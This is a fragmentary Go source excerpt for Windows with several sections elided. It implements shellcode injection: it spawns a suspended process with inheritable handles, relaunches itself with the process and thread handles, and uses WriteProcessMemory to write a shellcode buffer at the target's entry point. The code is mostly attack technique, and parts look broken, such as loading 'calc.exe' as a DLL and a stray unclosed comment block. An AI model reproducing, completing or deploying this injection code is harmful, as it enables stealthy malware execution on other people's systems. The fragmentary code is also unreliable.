...
func main(){
	if len(os.Args) == 1{
		...
		var sa_p windows.SecurityAttributes
		sa_p.Length = uint32(unsafe.Sizeof(sa_p))
		sa_p.SecurityDescriptor = nil
		sa_p.InheritHandle = 1

		var sa_t windows.SecurityAttributes
		sa_t.Length = uint32(unsafe.Sizeof(sa_t))
		sa_t.SecurityDescriptor = nil
		sa_t.InheritHandle = 1


		windows.CreateProcess(nil,cmd,&sa_p,&sa_t,true,windows.CREATE_SUSPENDED,nil,nil,&si,&pi)
		...
		e := exec.Command(os.Args[0],strconv.Itoa(int(codeEntry)),strconv.Itoa(int(pi.Process)),strconv.Itoa(int(pi.Thread)))
		fmt.Println(e)
		e.Start()

		/*
		cmdl :=os.Args[0]+" "+strconv.Itoa(int(codeEntry))+" "+strconv.Itoa(int(pi.Process))+" "+strconv.Itoa(int(pi.ThreadId))
		cmd1 := syscall.StringToUTF16Ptr(cmdl)

		var si1 windows.StartupInfo
		var pi1 windows.ProcessInformation

		windows.CreateProcess(nil,cmd1,nil,nil,true,windows.CREATE_NEW_CONSOLE,nil,nil,&si1,&pi1)
		...
		if len(os.Args) >= 4 {
			...
			pHndl,_ := strconv.Atoi(os.Args[2])
			...
			if _,e := syscall.LoadDLL("calc.exe");e == nil {
				...
				write(WriteProcessMemory,uintptr(pHndl),codeEntry,shellcode)
			...
			thndl ,_ := strconv.Atoi(os.Args[1])
...
func write(WriteProcessMemory *syscall.LazyProc,pHndl uintptr, codeEntry uintptr,shellcode []byte){
	WriteProcessMemory.Call(uintptr(pHndl), codeEntry, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)),0)
}
